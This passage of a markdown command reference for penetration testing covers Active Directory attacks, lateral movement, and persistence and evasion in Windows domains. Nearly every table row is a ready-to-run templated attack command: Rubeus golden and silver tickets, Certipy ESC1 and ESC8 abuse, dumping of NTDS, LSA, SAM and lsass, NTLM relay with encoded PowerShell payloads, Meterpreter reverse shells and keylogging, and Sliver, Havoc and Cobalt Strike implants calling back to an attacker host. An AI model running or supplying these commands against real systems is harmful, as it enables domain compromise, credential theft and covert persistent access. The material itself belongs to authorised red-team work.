| 8 | Delay Control | `kerbrute passwordspray --dc {dc_ip} -d {domain} {userlist} {pass} --delay 5 -o /opt/tsec/output/6.7.8_kerbrute_delay.txt` | TXT |
| 9 | Downgrade | `kerbrute userenum --dc {dc_ip} -d {domain} {userlist} --downgrade -o /opt/tsec/output/6.7.9_kerbrute_downgrade.txt` | TXT |
| 10 | Full Domain Audit | `kerbrute userenum --dc {dc_ip} -d {domain} {userlist} -o /opt/tsec/output/6.7.10_kerbrute_audit.txt && kerbrute passwordspray --dc {dc_ip} -d {domain} {userlist} {pass}` | TXT |

## Tool 6.8 — Rubeus
*C# toolset for raw Kerberos interaction and abuse.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Kerberoast | `Rubeus.exe kerberoast /format:hashcat /outfile:/opt/tsec/output/6.8.1_rubeus_kerberoast.txt` | TXT |
| 2 | AS-REP Roast | `Rubeus.exe asreproast /format:hashcat /outfile:/opt/tsec/output/6.8.2_rubeus_asrep.txt` | TXT |
| 3 | Ticket Dump | `Rubeus.exe dump /service:krbtgt /outfile:/opt/tsec/output/6.8.3_rubeus_tickets.txt` | TXT |
| 4 | Pass the Ticket | `Rubeus.exe ptt /ticket:{ticket_kirbi} > /opt/tsec/output/6.8.4_rubeus_ptt.txt` | TXT |
| 5 | Golden Ticket | `Rubeus.exe golden /user:{user} /domain:{domain} /sid:{sid} /krbtgt:{hash} /ptt > /opt/tsec/output/6.8.5_rubeus_golden.txt` | TXT |
| 6 | Silver Ticket | `Rubeus.exe silver /user:{user} /domain:{domain} /sid:{sid} /target:{host} /service:cifs /rc4:{hash} /ptt > /opt/tsec/output/6.8.6_rubeus_silver.txt` | TXT |
| 7 | TGT Renewal | `Rubeus.exe renew /ticket:{tgt_kirbi} /ptt > /opt/tsec/output/6.8.7_rubeus_renew.txt` | TXT |
| 8 | S4U Abuse | `Rubeus.exe s4u /user:{user} /rc4:{hash} /impersonateuser:admin /msdsspn:http/{host} /ptt > /opt/tsec/output/6.8.8_rubeus_s4u.txt` | TXT |
| 9 | Brute Force | `Rubeus.exe brute /password:{password} /noticket > /opt/tsec/output/6.8.9_rubeus_brute.txt` | TXT |
| 10 | Full Kerberos Audit | `Rubeus.exe kerberoast /format:hashcat && Rubeus.exe asreproast /format:hashcat && Rubeus.exe dump > /opt/tsec/output/6.8.10_rubeus_full.txt` | TXT |

## Tool 6.9 — Certipy
*Active Directory Certificate Services enumeration and abuse.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | CA Enum | `certipy find -u {user}@{domain} -p {password} -dc-ip {dc_ip} -output /opt/tsec/output/6.9.1_certipy_ca.json` | JSON |
| 2 | Vulnerable Templates | `certipy find -u {user}@{domain} -p {password} -dc-ip {dc_ip} -vulnerable -output /opt/tsec/output/6.9.2_certipy_vuln.json` | JSON |
| 3 | ESC1 Attack | `certipy req -u {user}@{domain} -p {password} -dc-ip {dc_ip} -ca {ca} -template {template} -upn administrator -output /opt/tsec/output/6.9.3_certipy_esc1.json` | JSON |
| 4 | ESC8 Attack | `certipy relay -target http://{ca}/certsrv/certfnsh.asp -ca {ca} > /opt/tsec/output/6.9.4_certipy_esc8.txt` | TXT |
| 5 | Certificate Auth | `certipy auth -pfx {cert}.pfx -dc-ip {dc_ip} > /opt/tsec/output/6.9.5_certipy_auth.txt` | TXT |
| 6 | ESC11 Attack | `certipy find -u {user}@{domain} -p {password} -dc-ip {dc_ip} -scheme ldaps -output /opt/tsec/output/6.9.6_certipy_esc11.json` | JSON |
| 7 | Template Abuse | `certipy req -u {user}@{domain} -p {password} -dc-ip {dc_ip} -ca {ca} -template {template} -on-behalf-of {domain}\\{target_user} -pfx {cert}.pfx > /opt/tsec/output/6.9.7_certipy_abuse.txt` | TXT |
| 8 | BloodHound | `certipy find -u {user}@{domain} -p {password} -dc-ip {dc_ip} -old-bloodhound -output /opt/tsec/output/6.9.8_certipy_bloodhound.json` | JSON |
| 9 | Shadow Credentials | `certipy shadow auto -u {user}@{domain} -p {password} -dc-ip {dc_ip} -account {target} > /opt/tsec/output/6.9.9_certipy_shadow.txt` | TXT |
| 10 | Full ADCS Audit | `certipy find -u {user}@{domain} -p {password} -dc-ip {dc_ip} -vulnerable -json -output /opt/tsec/output/6.9.10_certipy_full` | JSON |

## Tool 6.10 — NetExec (NXC)
*Network execution tool for credential validation and AD testing.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Credential Spray | `nxc smb {targets} -u {user} -p {password} > /opt/tsec/output/6.10.1_nxc_spray.txt` | TXT |
| 2 | SAM Dump | `nxc smb {targets} -u {user} -p {password} --sam > /opt/tsec/output/6.10.2_nxc_sam.txt` | TXT |
| 3 | LSA Dump | `nxc smb {targets} -u {user} -p {password} --lsa > /opt/tsec/output/6.10.3_nxc_lsa.txt` | TXT |
| 4 | NTDS Dump | `nxc smb {dc} -u {user} -p {password} --ntds drsuapi > /opt/tsec/output/6.10.4_nxc_ntds.txt` | TXT |
| 5 | Pass-the-Hash | `nxc smb {targets} -u {user} -H {nthash} > /opt/tsec/output/6.10.5_nxc_pth.txt` | TXT |
| 6 | DPAPI Dump | `nxc smb {targets} -u {user} -p {password} --dpapi cookies > /opt/tsec/output/6.10.6_nxc_dpapi.txt` | TXT |
| 7 | Mimikatz Module | `nxc smb {targets} -u {user} -p {password} -M mimikatz > /opt/tsec/output/6.10.7_nxc_mimikatz.txt` | TXT |
| 8 | LSassy Module | `nxc smb {targets} -u {user} -p {password} -M lsassy > /opt/tsec/output/6.10.8_nxc_lsassy.txt` | TXT |
| 9 | JSON Output | `nxc smb {targets} -u {user} -p {password} --sam --json > /opt/tsec/output/6.10.9_nxc.json` | JSON |
| 10 | Full Harvest | `nxc smb {targets} -u {user} -p {password} --sam --lsa --dpapi cookies -M mimikatz -M lsassy > /opt/tsec/output/6.10.10_nxc_full.txt` | TXT |

---

# Phase 7: Lateral Movement

> **Move through the target environment by compromising additional systems using legitimate credentials and protocol abuse.**

---

## Tool 7.1 — Evil-WinRM
*Ultimate WinRM shell for Windows remote management exploitation.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Connection | `evil-winrm -i {target_ip} -u {username} -p {password} > /opt/tsec/output/7.1.1_evilwinrm_{target_ip}.txt` | TXT |
| 2 | Hash Auth | `evil-winrm -i {target_ip} -u {username} -H {ntlm_hash} > /opt/tsec/output/7.1.2_evilwinrm_hash_{target_ip}.txt` | TXT |
| 3 | SSL Connection | `evil-winrm -i {target_ip} -u {username} -p {password} -S > /opt/tsec/output/7.1.3_evilwinrm_ssl_{target_ip}.txt` | TXT |
| 4 | Certificate Auth | `evil-winrm -i {target_ip} -c {cert_pem} -k {key_pem} > /opt/tsec/output/7.1.4_evilwinrm_cert_{target_ip}.txt` | TXT |
| 5 | File Upload | `evil-winrm -i {target_ip} -u {username} -p {password} -s {local_file} -d {remote_path} > /opt/tsec/output/7.1.5_evilwinrm_upload_{target_ip}.txt` | TXT |
| 6 | Script Loading | `evil-winrm -i {target_ip} -u {username} -p {password} -s {ps1_script} > /opt/tsec/output/7.1.6_evilwinrm_script_{target_ip}.txt` | TXT |
| 7 | AMSI Bypass | `evil-winrm -i {target_ip} -u {username} -p {password} -a > /opt/tsec/output/7.1.7_evilwinrm_amsi_{target_ip}.txt` | TXT |
| 8 | Service Enum | `evil-winrm -i {target_ip} -u {username} -p {password} -c "Get-Service \| Where-Object {\$_.Status -eq 'Running'}" > /opt/tsec/output/7.1.8_evilwinrm_services_{target_ip}.txt` | TXT |
| 9 | Menu Mode | `evil-winrm -i {target_ip} -u {username} -p {password} > /opt/tsec/output/7.1.9_evilwinrm_menu_{target_ip}.txt` | TXT |
| 10 | Full Session | `evil-winrm -i {target_ip} -u {username} -p {password} -S -a -s {ps_script} > /opt/tsec/output/7.1.10_evilwinrm_full_{target_ip}.txt` | TXT |

## Tool 7.2 — NetExec (NXC)
*Multi-protocol network exploitation for SMB, WinRM, LDAP, MSSQL, SSH.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | SMB Command | `nxc smb {targets} -u {user} -p {password} -x 'whoami' > /opt/tsec/output/7.2.1_nxc_smbcmd_{target}.txt` | TXT |
| 2 | PS Execution | `nxc smb {targets} -u {user} -p {password} -X 'Get-Process' > /opt/tsec/output/7.2.2_nxc_ps_{target}.txt` | TXT |
| 3 | Pass-the-Hash | `nxc smb {targets} -u {user} -H {hash} -x 'whoami' > /opt/tsec/output/7.2.3_nxc_pth_{target}.txt` | TXT |
| 4 | WinRM Exec | `nxc winrm {targets} -u {user} -p {password} -x 'hostname' > /opt/tsec/output/7.2.4_nxc_winrm_{target}.txt` | TXT |
| 5 | MSSQL Command | `nxc mssql {targets} -u {user} -p {password} -x 'whoami' > /opt/tsec/output/7.2.5_nxc_mssql_{target}.txt` | TXT |
| 6 | Spider Shares | `nxc smb {targets} -u {user} -p {password} -M spider_plus > /opt/tsec/output/7.2.6_nxc_spider_{target}.txt` | TXT |
| 7 | WMI Query | `nxc smb {targets} -u {user} -p {password} --wmi 'SELECT * FROM Win32_Process' > /opt/tsec/output/7.2.7_nxc_wmi_{target}.txt` | TXT |
| 8 | Local Auth | `nxc smb {targets} -u {user} -p {password} --local-auth > /opt/tsec/output/7.2.8_nxc_local_{target}.txt` | TXT |
| 9 | Kerberos Auth | `nxc smb {targets} -u {user} -p {password} -k --use-kcache > /opt/tsec/output/7.2.9_nxc_kerb_{target}.txt` | TXT |
| 10 | Lateral Sweep | `nxc smb {cidr} -u {user} -p {password} -x 'whoami' --continue-on-success > /opt/tsec/output/7.2.10_nxc_sweep.txt` | TXT |

## Tool 7.3 — Impacket Suite
*Python network protocol classes for lateral movement.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | SMBExec Shell | `smbexec.py {domain}/{user}:{password}@{target} > /opt/tsec/output/7.3.1_impacket_smbexec_{target}.txt` | TXT |
| 2 | WMIExec | `wmiexec.py {domain}/{user}:{password}@{target} > /opt/tsec/output/7.3.2_impacket_wmiexec_{target}.txt` | TXT |
| 3 | PSExec | `psexec.py {domain}/{user}:{password}@{target} > /opt/tsec/output/7.3.3_impacket_psexec_{target}.txt` | TXT |
| 4 | LDAP Dump | `ldapdomaindump -u {domain}\\{user} -p {password} {dc_ip} -o /opt/tsec/output/7.3.4_impacket_ldap_{dc_ip}` | DIR |
| 5 | Pass-the-Hash | `wmiexec.py -hashes {lmhash}:{nthash} {domain}/{user}@{target} > /opt/tsec/output/7.3.5_impacket_pth_{target}.txt` | TXT |
| 6 | NTLM Relay | `ntlmrelayx.py -tf {targets_file} -smb2support -c 'whoami' > /opt/tsec/output/7.3.6_impacket_relay.txt` | TXT |
| 7 | Lookupsid | `lookupsid.py {domain}/{user}:{password}@{target} > /opt/tsec/output/7.3.7_impacket_lookupsid_{target}.txt` | TXT |
| 8 | Atexec | `atexec.py {domain}/{user}:{password}@{target} 'whoami' > /opt/tsec/output/7.3.8_impacket_atexec_{target}.txt` | TXT |
| 9 | Dcomexec | `dcomexec.py {domain}/{user}:{password}@{target} > /opt/tsec/output/7.3.9_impacket_dcomexec_{target}.txt` | TXT |
| 10 | Full Protocol Suite | `wmiexec.py {creds}@{target} && smbexec.py {creds}@{target} && psexec.py {creds}@{target} > /opt/tsec/output/7.3.10_impacket_full_{target}.txt` | TXT |

## Tool 7.4 — BloodHound
*Graph-based Active Directory attack path analysis.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Data Collection | `SharpHound.exe -c All --zipfilename /opt/tsec/output/7.4.1_bloodhound_{domain}.zip` | ZIP |
| 2 | DCOnly | `SharpHound.exe -c DCOnly --zipfilename /opt/tsec/output/7.4.2_bloodhound_dconly_{domain}.zip` | ZIP |
| 3 | Session Collection | `SharpHound.exe -c Session --zipfilename /opt/tsec/output/7.4.3_bloodhound_session_{domain}.zip` | ZIP |
| 4 | ACL Collection | `SharpHound.exe -c ACL --zipfilename /opt/tsec/output/7.4.4_bloodhound_acl_{domain}.zip` | ZIP |
| 5 | Python Collector | `bloodhound.py -u {user} -p {password} -d {domain} -c All -o /opt/tsec/output/7.4.5_bloodhound_py_{domain}` | DIR |
| 6 | Collection Loop | `SharpHound.exe --loop --loopduration 01:00:00 --zipfilename /opt/tsec/output/7.4.6_bloodhound_loop_{domain}.zip` | ZIP |
| 7 | Trust Collection | `SharpHound.exe -c Trusts --zipfilename /opt/tsec/output/7.4.7_bloodhound_trusts_{domain}.zip` | ZIP |
| 8 | Group Policy | `SharpHound.exe -c GPOLocalGroup --zipfilename /opt/tsec/output/7.4.8_bloodhound_gpo_{domain}.zip` | ZIP |
| 9 | Stealth Collection | `SharpHound.exe -c DCOnly,Session --exclude-dc {dc_name} --zipfilename /opt/tsec/output/7.4.9_bloodhound_stealth_{domain}.zip` | ZIP |
| 10 | Full AD Audit | `SharpHound.exe -c All --collectallproperties --zipfilename /opt/tsec/output/7.4.10_bloodhound_full_{domain}.zip` | ZIP |

## Tool 7.5 — PsExec (Sysinternals)
*Microsoft's legitimate remote execution tool for SYSTEM access.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Remote Shell | `psexec.exe \\{target} -u {user} -p {password} cmd.exe > /opt/tsec/output/7.5.1_psexec_shell_{target}.txt` | TXT |
| 2 | System Shell | `psexec.exe \\{target} -u {user} -p {password} -s cmd.exe > /opt/tsec/output/7.5.2_psexec_system_{target}.txt` | TXT |
| 3 | Single Command | `psexec.exe \\{target} -u {user} -p {password} -s hostname > /opt/tsec/output/7.5.3_psexec_hostname_{target}.txt` | TXT |
| 4 | Copy & Execute | `psexec.exe \\{target} -u {user} -p {password} -c {local_exe} > /opt/tsec/output/7.5.4_psexec_copy_{target}.txt` | TXT |
| 5 | User Session | `psexec.exe \\{target} -u {user} -p {password} -i {session} notepad.exe > /opt/tsec/output/7.5.5_psexec_interactive_{target}.txt` | TXT |
| 6 | Network Batch | `psexec.exe @{targets_file} -u {user} -p {password} -s cmd /c 'systeminfo' > /opt/tsec/output/7.5.6_psexec_batch.txt` | TXT |
| 7 | No Profile | `psexec.exe \\{target} -u {user} -p {password} -e cmd.exe > /opt/tsec/output/7.5.7_psexec_noprofile_{target}.txt` | TXT |
| 8 | Timeout | `psexec.exe \\{target} -u {user} -p {password} -n 10 whoami > /opt/tsec/output/7.5.8_psexec_timeout_{target}.txt` | TXT |
| 9 | Hash Auth | `psexec.py {domain}/{user}@{target} -hashes {lmhash}:{nthash} > /opt/tsec/output/7.5.9_psexec_hash_{target}.txt` | TXT |
| 10 | Full Remote Admin | `psexec.exe \\{target} -u {user} -p {password} -s -c -f {payload} -d > /opt/tsec/output/7.5.10_psexec_full_{target}.txt` | TXT |

## Tool 7.6 — Ligolo-ng
*Advanced tunneling with TUN interface for transparent network pivoting.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Proxy Start | `./proxy -selfcert -laddr 0.0.0.0:{lport} > /opt/tsec/output/7.6.1_ligolo_proxy.txt` | TXT |
| 2 | Agent Connect | `./agent -connect {lhost}:{lport} -ignore-cert > /opt/tsec/output/7.6.2_ligolo_agent.txt` | TXT |
| 3 | TUN Setup | `sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up > /opt/tsec/output/7.6.3_ligolo_tun.txt` | TXT |
| 4 | Route Add | `sudo ip route add {internal_subnet}/24 dev ligolo > /opt/tsec/output/7.6.4_ligolo_route.txt` | TXT |
| 5 | Tunnel Start | `session -> tunnel_start > /opt/tsec/output/7.6.5_ligolo_tunnel.txt` | TXT |
| 6 | Listener Add | `listener_add -addr 0.0.0.0:{port} -to 127.0.0.1:{port} -bind > /opt/tsec/output/7.6.6_ligolo_listener.txt` | TXT |
| 7 | Multi-hop Pivot | `session -> tunnel_start -> agent -> connect {next_hop} > /opt/tsec/output/7.6.7_ligolo_multihop.txt` | TXT |
| 8 | Autoroute | `session -> tunnel_start -> add_route {subnet} > /opt/tsec/output/7.6.8_ligolo_autoroute.txt` | TXT |
| 9 | Port Forward | `listener_add -addr 0.0.0.0:{port} -to {internal_ip}:{port} > /opt/tsec/output/7.6.9_ligolo_portfwd.txt` | TXT |
| 10 | Full Pivot Chain | `proxy -> agent -> tunnel_start -> add_route -> listener_add > /opt/tsec/output/7.6.10_ligolo_full.txt` | TXT |

## Tool 7.7 — Chisel
*Fast TCP/UDP tunnel over HTTP for SOCKS5 proxy and port forwarding.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Server Start | `chisel server -p {port} --reverse > /opt/tsec/output/7.7.1_chisel_server.txt` | TXT |
| 2 | Client Connect | `chisel client http://{lhost}:{lport} {local_port}:{remote_host}:{remote_port} > /opt/tsec/output/7.7.2_chisel_client.txt` | TXT |
| 3 | Reverse SOCKS | `chisel client http://{lhost}:{lport} R:socks > /opt/tsec/output/7.7.3_chisel_socks.txt` | TXT |
| 4 | Forward SOCKS | `chisel client http://{lhost}:{lport} socks > /opt/tsec/output/7.7.4_chisel_fsocks.txt` | TXT |
| 5 | Multi Forward | `chisel client http://{lhost}:{lport} 3000:10.0.0.1:3000 3389:10.0.0.2:3389 > /opt/tsec/output/7.7.5_chisel_multi.txt` | TXT |
| 6 | Auth Protection | `chisel server -p {port} --auth {user}:{password} --reverse > /opt/tsec/output/7.7.6_chisel_auth.txt` | TXT |
| 7 | UDP Forwarding | `chisel client http://{lhost}:{lport} udp://53:10.0.0.1:53 > /opt/tsec/output/7.7.7_chisel_udp.txt` | TXT |
| 8 | Fingerprint | `chisel client --fingerprint '{hash}' http://{lhost}:{lport} {ports} > /opt/tsec/output/7.7.8_chisel_fingerprint.txt` | TXT |
| 9 | Header Auth | `chisel client --header 'X-Auth={token}' http://{lhost}:{lport} {ports} > /opt/tsec/output/7.7.9_chisel_header.txt` | TXT |
| 10 | Full Tunnel | `chisel server -p 443 --auth u:p --reverse --socks5 && chisel client --auth u:p https://{lhost} R:socks > /opt/tsec/output/7.7.10_chisel_full.txt` | TXT |

## Tool 7.8 — Proxychains
*Force TCP connections through SOCKS/HTTP proxies.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | SOCKS5 Nmap | `proxychains nmap -sT -Pn {internal_subnet} > /opt/tsec/output/7.8.1_proxychains_nmap.txt` | TXT |
| 2 | RDP Through Proxy | `proxychains xfreerdp /u:{user} /p:{password} /v:{internal_ip} > /opt/tsec/output/7.8.2_proxychains_rdp.txt` | TXT |
| 3 | SSH via Proxy | `proxychains ssh {user}@{internal_ip} > /opt/tsec/output/7.8.3_proxychains_ssh.txt` | TXT |
| 4 | HTTP Access | `proxychains curl http://{internal_ip}:8080 > /opt/tsec/output/7.8.4_proxychains_http.txt` | TXT |
| 5 | DNS Override | `proxychains -q nmap --dns-servers {dns_ip} -sT {target} > /opt/tsec/output/7.8.5_proxychains_dns.txt` | TXT |
| 6 | Metasploit Route | `proxychains msfconsole -r {resource_script} > /opt/tsec/output/7.8.6_proxychains_msf.txt` | TXT |
| 7 | Multi-proxy | `proxychains -f {config_file} {command} > /opt/tsec/output/7.8.7_proxychains_multi.txt` | TXT |
| 8 | Quiet Mode | `proxychains -q {command} > /opt/tsec/output/7.8.8_proxychains_quiet.txt` | TXT |
| 9 | SMB Enum | `proxychains crackmapexec smb {internal_subnet} -u {user} -p {password} > /opt/tsec/output/7.8.9_proxychains_smb.txt` | TXT |
| 10 | Full Internal Scan | `proxychains nmap -sT -Pn -p 22,80,443,445,3389,5985 {internal_subnet} > /opt/tsec/output/7.8.10_proxychains_full.txt` | TXT |

## Tool 7.9 — sshuttle
*Transparent VPN over SSH for network pivoting.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Full Tunnel | `sshuttle -r {user}@{pivot_host} {internal_subnet}/24 > /opt/tsec/output/7.9.1_sshuttle_full.txt` | TXT |
| 2 | DNS Forward | `sshuttle -r {user}@{pivot_host} {internal_subnet}/24 --dns > /opt/tsec/output/7.9.2_sshuttle_dns.txt` | TXT |
| 3 | Listen All | `sshuttle -r {user}@{pivot_host} {internal_subnet}/24 -l 0.0.0.0 > /opt/tsec/output/7.9.3_sshuttle_listen.txt` | TXT |
| 4 | Auto Hosts | `sshuttle -r {user}@{pivot_host} {internal_subnet}/24 --auto-hosts --dns > /opt/tsec/output/7.9.4_sshuttle_autohosts.txt` | TXT |
| 5 | Exclude Routes | `sshuttle -r {user}@{pivot_host} -x {excluded_subnet} {subnet}/24 > /opt/tsec/output/7.9.5_sshuttle_exclude.txt` | TXT |
| 6 | Daemon Mode | `sshuttle -r {user}@{pivot_host} {subnet}/24 --daemon > /opt/tsec/output/7.9.6_sshuttle_daemon.txt` | TXT |
| 7 | Key Auth | `sshuttle -r {user}@{pivot_host} -e 'ssh -i {key}' {subnet}/24 > /opt/tsec/output/7.9.7_sshuttle_key.txt` | TXT |
| 8 | Custom Port | `sshuttle -r {user}@{pivot_host}:{port} {subnet}/24 > /opt/tsec/output/7.9.8_sshuttle_port.txt` | TXT |
| 9 | Auto-nets | `sshuttle -r {user}@{pivot_host} --auto-nets > /opt/tsec/output/7.9.9_sshuttle_autonets.txt` | TXT |
| 10 | Full VPN | `sshuttle -r {user}@{pivot_host} --dns --auto-hosts --auto-nets -D > /opt/tsec/output/7.9.10_sshuttle_vpn.txt` | TXT |

## Tool 7.10 — ntlmrelayx.py
*NTLM relay attack tool for SMB, HTTP, LDAP, MSSQL relaying.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | SMB Relay | `ntlmrelayx.py -tf {targets_file} -smb2support > /opt/tsec/output/7.10.1_ntlmrelayx_smb.txt` | TXT |
| 2 | Command Exec | `ntlmrelayx.py -t {target} -c 'whoami /all' -smb2support > /opt/tsec/output/7.10.2_ntlmrelayx_cmd.txt` | TXT |
| 3 | LDAP Dump | `ntlmrelayx.py -t ldap://{dc_ip} --no-da --no-acl > /opt/tsec/output/7.10.3_ntlmrelayx_ldap.txt` | TXT |
| 4 | LDAP Account | `ntlmrelayx.py -t ldap://{dc_ip} --add-computer {computer_name} > /opt/tsec/output/7.10.4_ntlmrelayx_account.txt` | TXT |
| 5 | HTTP Server | `ntlmrelayx.py -t {target} --serve-image {image} -smb2support > /opt/tsec/output/7.10.5_ntlmrelayx_http.txt` | TXT |
| 6 | WPAD Attack | `ntlmrelayx.py -tf {targets_file} -w -l /opt/tsec/output/7.10.6_ntlmrelayx_wpad.log` | LOG |
| 7 | IPv6 DNS | `ntlmrelayx.py -t {target} -6 -wh {domain} -l /opt/tsec/output/7.10.7_ntlmrelayx_ipv6.log` | LOG |
| 8 | SOCKS Proxy | `ntlmrelayx.py -tf {targets_file} -socks -smb2support > /opt/tsec/output/7.10.8_ntlmrelayx_socks.txt` | TXT |
| 9 | File Output | `ntlmrelayx.py -t {target} -of /opt/tsec/output/7.10.9_ntlmrelayx_{target}.txt -smb2support` | TXT |
| 10 | Full Relay Chain | `ntlmrelayx.py -tf {targets_file} -c 'powershell -enc {payload}' -smb2support -l /opt/tsec/output/7.10.10_ntlmrelayx_full.log` | LOG |

---

# Phase 8: Persistence & Defense Evasion

> **Maintain long-term access while avoiding detection through stealth techniques, AMSI bypass, and process injection.**

---

## Tool 8.1 — Metasploit Framework
*Industry-standard penetration testing framework.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Exploit Launch | `msfconsole -x 'use {exploit}; set RHOSTS {target}; set PAYLOAD {payload}; set LHOST {lhost}; run' > /opt/tsec/output/8.1.1_msf_exploit.txt` | TXT |
| 2 | Handler Start | `msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run' > /opt/tsec/output/8.1.2_msf_handler.txt` | TXT |
| 3 | Persistence Service | `meterpreter > run persistence -U -i 5 -p {port} -r {lhost} > /opt/tsec/output/8.1.3_msf_persistence.txt` | TXT |
| 4 | Process Migrate | `meterpreter > migrate {pid} > /opt/tsec/output/8.1.4_msf_migrate.txt` | TXT |
| 5 | Keylogger | `meterpreter > keyscan_start > /opt/tsec/output/8.1.5_msf_keylog.txt` | TXT |
| 6 | Screenshot | `meterpreter > screenshot -p /opt/tsec/output/8.1.6_msf_screenshot.png` | PNG |
| 7 | Hash Dump | `meterpreter > hashdump > /opt/tsec/output/8.1.7_msf_hashdump.txt` | TXT |
| 8 | Port Forward | `meterpreter > portfwd add -l {local} -p {remote} -r {target} > /opt/tsec/output/8.1.8_msf_portfwd.txt` | TXT |
| 9 | Route Add | `meterpreter > run autoroute -s {subnet} > /opt/tsec/output/8.1.9_msf_route.txt` | TXT |
| 10 | Full Session | `msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {port}; set ExitOnSession false; set AutoRunScript post/windows/manage/migrate; run -j' > /opt/tsec/output/8.1.10_msf_full.txt` | TXT |

## Tool 8.2 — Cobalt Strike
*Commercial adversary simulation and red team platform.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Listener Setup | `teamserver {lhost} {password} {c2_profile} > /opt/tsec/output/8.2.1_cs_teamserver.log` | LOG |
| 2 | Payload Gen | `./aggressor -host {host} -port {port} -user {user} -password {password} > /opt/tsec/output/8.2.2_cs_payload.txt` | TXT |
| 3 | PowerShell Payload | `./aggressor -host {host} -port {port} -user {user} -password {password} -command "powershell" > /opt/tsec/output/8.2.3_cs_ps1.txt` | TXT |
| 4 | Browser Pivot | `./aggressor -host {host} -port {port} -user {user} -password {password} -command "browserpivot {pid}" > /opt/tsec/output/8.2.4_cs_browser.txt` | TXT |
| 5 | SSH Tunnel | `./aggressor -host {host} -port {port} -user {user} -password {password} -command "ssh {target} {user} {password}" > /opt/tsec/output/8.2.5_cs_ssh.txt` | TXT |
| 6 | SOCKS Proxy | `./aggressor -host {host} -port {port} -user {user} -password {password} -command "socks {port}" > /opt/tsec/output/8.2.6_cs_socks.txt` | TXT |
| 7 | Golden Ticket | `./aggressor -host {host} -port {port} -user {user} -password {password} -command "golden_ticket {domain} {krbtgt_hash}" > /opt/tsec/output/8.2.7_cs_golden.txt` | TXT |
| 8 | Token Steal | `./aggressor -host {host} -port {port} -user {user} -password {password} -command "steal_token {pid}" > /opt/tsec/output/8.2.8_cs_token.txt` | TXT |
| 9 | Execute Assembly | `./aggressor -host {host} -port {port} -user {user} -password {password} -command "execute-assembly {dotnet_assembly}" > /opt/tsec/output/8.2.9_cs_assembly.txt` | TXT |
| 10 | Malleable C2 | `./aggressor -host {host} -port {port} -user {user} -password {password} -command "load_profile {profile}.profile" > /opt/tsec/output/8.2.10_cs_malleable.txt` | TXT |

## Tool 8.3 — Sliver C2 (Persistence)
*Advanced cross-platform C2 with persistence capabilities.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Generate Implant | `sliver-server generate --mtls {lhost}:{lport} --os windows --arch amd64 --save /opt/tsec/output/8.3.1_sliver_persist.exe` | EXE |
| 2 | HTTPS Beacon | `sliver-server generate --http https://{lhost} --os linux --arch amd64 --save /opt/tsec/output/8.3.2_sliver_https.elf` | ELF |
| 3 | DNS Beacon | `sliver-server generate --dns {domain} --os windows --arch amd64 --save /opt/tsec/output/8.3.3_sliver_dns.exe` | EXE |
| 4 | Shellcode | `sliver-server generate --http {lhost}:{lport} --format shellcode --save /opt/tsec/output/8.3.4_sliver_shellcode.bin` | BIN |
| 5 | Execute Assembly | `sliver-server execute-assembly -t {session} {assembly} {args} > /opt/tsec/output/8.3.5_sliver_assembly.txt` | TXT |
| 6 | Process Migrate | `sliver-server migrate -t {session} {pid} > /opt/tsec/output/8.3.6_sliver_migrate.txt` | TXT |
| 7 | Shellcode Exec | `sliver-server execute-shellcode -t {session} {shellcode_file} > /opt/tsec/output/8.3.7_sliver_shellcode.txt` | TXT |
| 8 | Credential Dump | `sliver-server procdump -t {session} -n lsass.exe > /opt/tsec/output/8.3.8_sliver_procdump.dmp` | DMP |
| 9 | Port Forward | `sliver-server portfwd add -r {remote_host}:{remote_port} -l {local_port} > /opt/tsec/output/8.3.9_sliver_portfwd.txt` | TXT |
| 10 | Multiplayer | `sliver-server multiplayer > /opt/tsec/output/8.3.10_sliver_multiplayer.txt` | TXT |

## Tool 8.4 — Havoc C2 (Evasion)
*Modern C2 with Demon agent and sleep mask obfuscation.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Demon Generate | `./havoc client -> payload generate --profile {profile} --arch x64 --format exe --sleep 15 --jitter 20 --output /opt/tsec/output/8.4.1_havoc_demon.exe` | EXE |
| 2 | DLL Agent | `./havoc client -> payload generate --profile {profile} --arch x64 --format dll --output /opt/tsec/output/8.4.2_havoc_dll.dll` | DLL |
| 3 | Shellcode | `./havoc client -> payload generate --profile {profile} --arch x64 --format shellcode --output /opt/tsec/output/8.4.3_havoc_shellcode.bin` | BIN |
| 4 | Service Binary | `./havoc client -> payload generate --profile {profile} --arch x64 --format service-exe --output /opt/tsec/output/8.4.4_havoc_service.exe` | EXE |
| 5 | PowerShell | `./havoc client -> payload generate --profile {profile} --arch x64 --format pspowershell --output /opt/tsec/output/8.4.5_havoc_ps1.ps1` | PS1 |
| 6 | Listener Create | `./havoc client -> listener create --name {name} --protocol http --port {port} --hosts {lhost} > /opt/tsec/output/8.4.6_havoc_listener.txt` | TXT |
| 7 | Token Steal | `./havoc client -> token steal {pid} > /opt/tsec/output/8.4.7_havoc_token.txt` | TXT |
| 8 | Shellcode Inject | `./havoc client -> shellcode inject {pid} {shellcode_file} > /opt/tsec/output/8.4.8_havoc_inject.txt` | TXT |
| 9 | Transfer Download | `./havoc client -> transfer download {remote_file} {local_path} > /opt/tsec/output/8.4.9_havoc_download.txt` | TXT |
